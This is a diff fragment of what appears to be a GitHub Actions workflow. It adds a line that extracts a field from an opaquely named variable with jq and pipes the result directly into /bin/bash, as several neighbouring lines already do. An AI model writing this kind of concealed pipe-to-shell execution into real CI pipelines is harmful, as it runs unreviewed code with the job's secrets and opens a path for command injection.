@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$mdzid712" | jq -r .lhi1426 | /bin/bash
           echo $crpi18095 | jq -r .j5146 | /bin/bash
           printf '%s' "$m51" | jq -r .qra74431 | /bin/bash
+          echo $stbh091 | jq -r .w334 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
